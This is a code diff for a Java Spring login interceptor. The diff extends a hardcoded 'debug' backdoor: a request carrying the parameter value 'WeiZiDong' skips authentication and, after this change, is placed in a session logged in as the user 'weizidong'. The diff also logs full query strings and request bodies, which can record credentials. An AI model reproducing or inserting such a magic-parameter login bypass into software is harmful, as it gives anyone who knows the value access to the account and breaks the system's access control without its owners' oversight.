@@ -8,16 +8,20 @@ import javax.servlet.http.HttpSession;
 
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.util.StreamUtils;
 import org.springframework.web.servlet.HandlerInterceptor;
 import org.springframework.web.servlet.ModelAndView;
 
 import xin.chaoyueshidai.module.user.User;
+import xin.chaoyueshidai.module.user.UserService;
 
 public class LoginInterceptor implements HandlerInterceptor {
 	private static final Logger log = LogManager.getLogger(LoginInterceptor.class);
 	// 不拦截 "/login" 请求
 	private static final String[] IGNORE_URI = { "/user/login" };
+	@Autowired
+	private UserService userService;
 
 	@Override
 	public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception e)
@@ -35,18 +39,25 @@ public class LoginInterceptor implements HandlerInterceptor {
 	@Override
 	public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)
 			throws Exception {
-		// 获取请求的 URL
-		String url = request.getServletPath();
-		log.debug("请求：" + url);
-		log.debug("参数：" + StreamUtils.copyToString(request.getInputStream(), Charset.defaultCharset()));
-		HttpSession session = request.getSession();
-		session.setAttribute("start", System.currentTimeMillis());
-		String debug = request.getParameter("debug");
-		if (debug != null && debug.equals("WeiZiDong")) {
-			return true;
-		}
 		// flag 表示是否登录
 		boolean flag = false;
+		// 获取请求的 URL
+		String url = request.getServletPath();
+		String query = request.getQueryString();
+		log.debug("请求：" + url + "?" + query);
+		log.debug("参数：" + StreamUtils.copyToString(request.getInputStream(), Charset.defaultCharset()));
+		String debug = request.getParameter("debug");
+		HttpSession session = request.getSession();
+		session.setAttribute("start", System.currentTimeMillis());
+		if (debug != null && debug.equals("WeiZiDong")) {
+			log.debug("开启debug模式。。。");
+			User admin = (User) session.getAttribute("user");
+			if (admin == null) {
+				admin = userService.getByUsername("weizidong");
+				session.setAttribute("user", admin);
+			}
+			return true;
+		}
 		for (String s : IGNORE_URI) {
 			if (url.equals("/") || url.contains(s)) {
 				flag = true;
